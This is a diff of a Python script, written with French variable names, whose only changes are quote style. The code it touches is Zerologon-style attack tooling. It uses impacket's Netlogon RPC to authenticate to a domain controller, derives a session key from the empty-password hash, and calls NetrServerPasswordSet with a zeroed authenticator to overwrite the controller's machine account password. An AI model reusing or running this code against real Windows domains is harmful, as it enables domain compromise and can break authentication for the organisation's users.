@@ -11,9 +11,9 @@ import hmac, hashlib, struct, sys, socket, time
 from binascii import hexlify, unhexlify
 from Cryptodome.Cipher import DES, AES, ARC4
 
-DC_HOSTNAME = ""
-DC_IP = ""
-DC_MDP = ""
+DC_HOSTNAME = ''
+DC_IP = ''
+DC_MDP = ''
 
 class NetrServerPasswordSet(nrpc.NDRCALL):
     opnum = 6
@@ -48,7 +48,7 @@ def connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc
 
   try:
     server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_primary_name + '\x00', dc_account_name+'\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, dc_computer_name + '\x00', client_credential, negotiate_flags)
-    sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"))
+    sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify('31d6cfe0d16ae931b73c59d7e0c089c0'))
     
     try:
       nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
@@ -62,13 +62,13 @@ def connexion_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name, dc
 
       authenticateur = nrpc.NETLOGON_AUTHENTICATOR()
       authenticateur['Credential'] = client_credential
-      authenticateur['Timestamp'] = b"\x00" * 4
+      authenticateur['Timestamp'] = b'\x00' * 4
 
-      requete["Authenticator"] = authenticateur
+      requete['Authenticator'] = authenticateur
 
       pwdata = impacket.crypto.SamEncryptNTLMHash(unhexlify(dc_mdp), sessionKey)
 
-      requete["UasNewPassword"] = pwdata
+      requete['UasNewPassword'] = pwdata
       resp = rpc_con.request(requete)
       resp.dump()
 
